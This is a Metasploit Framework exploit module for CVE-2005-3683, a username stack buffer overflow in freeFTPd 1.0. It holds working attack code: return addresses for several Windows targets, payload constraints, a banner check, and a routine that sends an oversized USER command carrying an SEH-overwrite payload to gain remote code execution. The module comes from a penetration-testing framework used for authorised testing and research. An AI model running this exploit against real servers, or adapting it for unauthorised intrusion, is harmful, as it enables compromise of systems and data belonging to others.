##
# $Id: freeftpd_user.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'freeFTPd 1.0 Username Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the freeFTPd
				multi-protocol file transfer service. This flaw can only be
				exploited when logging has been enabled (non-default).
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2005-3683'],
					[ 'OSVDB', '20909'],
					[ 'BID', '15457'],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2005-November/038808.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Windows 2000 English ALL',
						{
							'Platform' => 'win',
							'Ret'      => 0x75022ac4,
						},
					],
					[
						'Windows XP Pro SP0/SP1 English',
						{
							'Platform' => 'win',
							'Ret'      => 0x71aa32ad,
						},
					],
					[
						'Windows NT SP5/SP6a English',
						{
							'Platform' => 'win',
							'Ret'      => 0x776a1799,
						},
					],
					[
						'Windows 2003 Server English',
						{
							'Platform' => 'win',
							'Ret'      => 0x7ffc0638,
						},
					],
				],
			'DisclosureDate'  => 'Nov 16 2005'
		))
	end

	def check
		connect
		disconnect
		if (banner =~ /freeFTPd 1\.0/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		buf          = rand_text_english(1816, payload_badchars)
		seh          = generate_seh_payload(target.ret)
		buf[1008, seh.length] = seh

		send_cmd( ['USER', buf] , false)

		handler
		disconnect
	end

end
